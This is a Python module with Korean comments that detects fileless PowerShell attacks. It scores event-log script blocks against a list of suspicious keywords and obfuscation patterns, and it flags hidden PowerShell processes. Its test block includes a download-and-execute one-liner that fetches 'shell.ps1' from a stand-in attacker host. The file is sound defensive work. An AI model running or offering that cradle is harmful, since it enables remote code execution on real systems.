"""
fileless_detector.py
────────────────────
PowerShell 메모리 기반 공격 탐지 모듈
- Event ID 4104: PowerShell Script Block Logging
- Event ID 4688: Process Creation (파라미터 로깅)
- 의심 키워드/패턴 분석
- 난독화(Obfuscation) 감지
"""

import subprocess
import json
import re
from datetime import datetime, timedelta
from typing import List, Dict, Optional
import base64

# ======================================================================
# 1. 의심 PowerShell 패턴 정의
# ======================================================================

SUSPICIOUS_KEYWORDS = {
    "DownloadString": {"risk": "H", "desc": "원격 파일 다운로드"},
    "DownloadFile": {"risk": "H", "desc": "원격 파일 다운로드"},
    "IEX": {"risk": "H", "desc": "동적 코드 실행 (Invoke-Expression)"},
    "Invoke-Expression": {"risk": "H", "desc": "동적 코드 실행"},
    "New-Object": {"risk": "M", "desc": "COM 객체 생성"},
    "WScript.Shell": {"risk": "H", "desc": "Windows 스크립트 호스트 호출"},
    "System.Net.WebClient": {"risk": "H", "desc": "원격 연결 시도"},
    "-NoProfile": {"risk": "M", "desc": "프로필 우회 (숨김 목적)"},
    "-Hidden": {"risk": "M", "desc": "숨겨진 실행"},
    "-NoExit": {"risk": "M", "desc": "종료 방지"},
    "-WindowStyle": {"risk": "M", "desc": "윈도우 스타일 조작"},
    "cmd /c": {"risk": "M", "desc": "명령 프롬프트 체이닝"},
    "-EncodedCommand": {"risk": "H", "desc": "인코딩된 명령"},
    "FromBase64String": {"risk": "H", "desc": "Base64 디코딩"},
    "Reflection": {"risk": "H", "desc": "리플렉션을 통한 메모리 접근"},
    "[Byte]": {"risk": "M", "desc": "바이트 배열 (난독화 가능성)"},
    "ToString": {"risk": "M", "desc": "String 변환 (난독화 가능성)"},
    "Replace": {"risk": "M", "desc": "문자열 대체 (난독화)"},
    "$env": {"risk": "L", "desc": "환경 변수 접근"},
}

OBFUSCATION_PATTERNS = {
    "powershell.*-e[ncodedcommand]*": "인코딩된 명령어",
    r"\[system\.text\.encoding\].*::": "텍스트 인코딩 사용",
    r"\$\{.*\}": "변수 보간 (난독화)",
    r"['\"].*\$\(.*\)\$\{.*\}": "복잡한 문자열 조합",
    r"\.\s*\(": "메서드 체이닝",
}

# ======================================================================
# 2. PowerShell Event 수집 (Event ID 4104)
# ======================================================================

def collect_powershell_events(hours: int = 1) -> List[Dict]:
    """
    최근 N시간의 PowerShell Script Block Logging 이벤트 수집 (Event ID 4104)
    
    Args:
        hours: 조회 시간 범위 (기본 1시간)
    
    Returns:
        PowerShell 이벤트 리스트
    """
    try:
        # 최근 시간 계산
        time_ago = datetime.now() - timedelta(hours=hours)
        time_str = time_ago.strftime("%Y-%m-%dT%H:%M:%S")
        
        # PowerShell 이벤트 로그 조회 (Event ID 4104)
        ps_command = (
            f"Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' "
            f"-FilterXPath \"*[System[EventID=4104] and System[TimeCreated[@SystemTime>='{time_str}']]]\" "
            f"-ErrorAction SilentlyContinue | "
            f"Select-Object @{{"
            f"Name='EventID'; Expression={{$_.ID}}}}, "
            f"@{{Name='TimeCreated'; Expression={{$_.TimeCreated}}}}, "
            f"@{{Name='ComputerName'; Expression={{$_.MachineName}}}}, "
            f"@{{Name='Message'; Expression={{$_.Message}}}} | "
            f"ConvertTo-Json"
        )
        
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_command],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0 and result.stdout.strip():
            try:
                events = json.loads(result.stdout)
                if not isinstance(events, list):
                    events = [events]
                return events
            except json.JSONDecodeError:
                return []
        
        return []
    
    except Exception as e:
        print(f"⚠️ PowerShell 이벤트 수집 오류: {e}")
        return []


# ======================================================================
# 3. 의심 패턴 분석
# ======================================================================

def analyze_powershell_command(command: str) -> Dict:
    """
    PowerShell 명령어 분석 및 위협도 평가
    
    Args:
        command: 분석할 PowerShell 명령어
    
    Returns:
        {
            'risk_level': 'H' | 'M' | 'L',
            'risk_score': 0.0 ~ 1.0,
            'detected_keywords': [...],
            'obfuscation_indicators': [...],
            'is_fileless': bool,
            'description': 'string'
        }
    """
    
    risk_score = 0.0
    detected_keywords = []
    obfuscation_indicators = []
    
    # 케이스 인센시티브 분석
    cmd_lower = command.lower()
    
    # ========================================
    # 1단계: 의심 키워드 검출
    # ========================================
    for keyword, info in SUSPICIOUS_KEYWORDS.items():
        if keyword.lower() in cmd_lower:
            detected_keywords.append({
                "keyword": keyword,
                "risk": info["risk"],
                "description": info["desc"]
            })
            # 위험도에 따른 점수 가산
            if info["risk"] == "H":
                risk_score += 0.25
            elif info["risk"] == "M":
                risk_score += 0.1
            else:  # L
                risk_score += 0.05
    
    # ========================================
    # 2단계: 난독화 패턴 검출
    # ========================================
    for pattern, description in OBFUSCATION_PATTERNS.items():
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            obfuscation_indicators.append(description)
            risk_score += 0.15
    
    # ========================================
    # 3단계: 인코딩 명령어 검출 (Base64)
    # ========================================
    if "-encodedcommand" in cmd_lower or "-e " in cmd_lower or "-ec " in cmd_lower:
        try:
            # -EncodedCommand 이후 값 추출 시도
            match = re.search(r'-e(?:ncodedcommand)?\s+([A-Za-z0-9+/=]+)', cmd_lower)
            if match:
                encoded = match.group(1)
                # Base64 패딩 추가
                padding = 4 - len(encoded) % 4
                if padding != 4:
                    encoded += '=' * padding
                
                try:
                    decoded = base64.b64decode(encoded).decode('utf-16-le', errors='ignore')
                    obfuscation_indicators.append(f"Base64 인코딩됨: {decoded[:100]}")
                    risk_score += 0.20
                except:
                    obfuscation_indicators.append("Base64 인코딩됨 (디코딩 불가)")
                    risk_score += 0.15
        except:
            pass
    
    # ========================================
    # 4단계: 복합 위협 패턴
    # ========================================
    # 원격 다운로드 + 실행 조합
    if (("downloadstring" in cmd_lower or "downloadfile" in cmd_lower) and 
        ("iex" in cmd_lower or "invoke-expression" in cmd_lower)):
        obfuscation_indicators.append("다운로드+실행 체인 (악성 가능성 높음)")
        risk_score += 0.25
    
    # 스크립트 블록 우회 (숨김 + 프로필 우회)
    if ("-noprofile" in cmd_lower or "-hidden" in cmd_lower or 
        "-windowstyle hidden" in cmd_lower):
        obfuscation_indicators.append("숨겨진 실행 시도")
        risk_score += 0.15
    
    # 정규화
    risk_score = min(risk_score, 1.0)
    
    # 위험도 단계 결정
    if risk_score >= 0.7:
        risk_level = "H"
    elif risk_score >= 0.4:
        risk_level = "M"
    else:
        risk_level = "L"
    
    # Fileless 공격 판정
    is_fileless = risk_score >= 0.4 and (
        len(detected_keywords) > 0 or len(obfuscation_indicators) > 0
    )
    
    return {
        "risk_level": risk_level,
        "risk_score": round(risk_score, 2),
        "detected_keywords": detected_keywords,
        "obfuscation_indicators": obfuscation_indicators,
        "is_fileless": is_fileless,
        "description": f"PowerShell 의심 명령: {len(detected_keywords)}개 키워드, {len(obfuscation_indicators)}개 난독화 패턴"
    }


# ======================================================================
# 4. 백그라운드 PowerShell 탐지
# ======================================================================

def detect_background_powershell() -> List[Dict]:
    """
    백그라운드에서 실행 중인 의심 PowerShell 프로세스 탐지
    - 숨겨진 윈도우
    - 최소화 상태
    - 콘솔 없음
    
    Returns:
        의심 PowerShell 프로세스 리스트
    """
    try:
        ps_command = (
            "Get-Process -Name powershell, pwsh -ErrorAction SilentlyContinue | "
            "Where-Object {$_.MainWindowTitle -eq '' -or $_.MainWindowHandle -eq 0} | "
            "Select-Object @{{Name='ProcessID'; Expression={{$_.Id}}}}, "
            "@{{Name='ProcessName'; Expression={{$_.ProcessName}}}}, "
            "@{{Name='CommandLine'; Expression={{$_.CommandLine}}}} | "
            "ConvertTo-Json"
        )
        
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_command],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0 and result.stdout.strip():
            try:
                processes = json.loads(result.stdout)
                if not isinstance(processes, list):
                    processes = [processes] if processes else []
                return processes
            except json.JSONDecodeError:
                return []
        
        return []
    
    except Exception as e:
        print(f"⚠️ 백그라운드 PowerShell 탐지 오류: {e}")
        return []


# ======================================================================
# 5. 통합 Fileless 탐지
# ======================================================================

def detect_fileless_threats(hours: int = 1) -> List[Dict]:
    """
    Fileless 공격 종합 탐지
    
    Returns:
        위협 정보 리스트
    """
    threats = []
    
    # PowerShell 스크립트 블록 이벤트 수집
    ps_events = collect_powershell_events(hours)
    
    for event in ps_events:
        message = event.get("Message", "")
        
        analysis = analyze_powershell_command(message)
        
        if analysis["is_fileless"]:
            threat = {
                "threat_type": "Fileless.PowerShell",
                "event_id": 4104,
                "timestamp": event.get("TimeCreated"),
                "computer_name": event.get("ComputerName"),
                "risk_level": analysis["risk_level"],
                "risk_score": analysis["risk_score"],
                "command_snippet": message[:200],  # 처음 200자
                "keywords_detected": analysis["detected_keywords"],
                "obfuscation_flags": analysis["obfuscation_indicators"],
                "description": analysis["description"],
                "mitre_tactic": "Defense Evasion / Execution",
                "mitre_technique": "T1140 (Deobfuscate/Decode Files or Information)",
            }
            threats.append(threat)
    
    # 백그라운드 PowerShell 프로세스 탐지
    bg_processes = detect_background_powershell()
    
    for proc in bg_processes:
        threat = {
            "threat_type": "Fileless.BackgroundProcess",
            "event_id": 1,  # 프로세스 생성
            "timestamp": datetime.now().isoformat(),
            "computer_name": "LOCAL",
            "risk_level": "M",
            "risk_score": 0.6,
            "process_id": proc.get("ProcessID"),
            "process_name": proc.get("ProcessName"),
            "command_line": proc.get("CommandLine"),
            "description": "백그라운드 PowerShell 프로세스 (숨겨진 실행)",
            "mitre_tactic": "Execution / Defense Evasion",
            "mitre_technique": "T1086 (PowerShell)",
        }
        threats.append(threat)
    
    return threats


# ======================================================================
# 6. 테스트 함수
# ======================================================================

if __name__ == "__main__":
    print("=" * 70)
    print("🔍 Fileless 공격 탐지 테스트")
    print("=" * 70)
    
    # 테스트 명령어
    test_commands = [
        "powershell.exe -NoProfile -Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')",
        "powershell.exe -e JABhID0AJAhaAy8-=",
        "Get-Process",
        "New-Item -Path C:\\test.txt",
        "powershell.exe -WindowStyle Hidden cmd /c \"dir\"",
    ]
    
    print("\n📋 명령어 분석 결과:\n")
    for cmd in test_commands:
        analysis = analyze_powershell_command(cmd)
        print(f"[{analysis['risk_level']}] {cmd[:60]}")
        print(f"   점수: {analysis['risk_score']}, Fileless: {analysis['is_fileless']}")
        if analysis['detected_keywords']:
            print(f"   키워드: {', '.join([k['keyword'] for k in analysis['detected_keywords']])}")
        print()
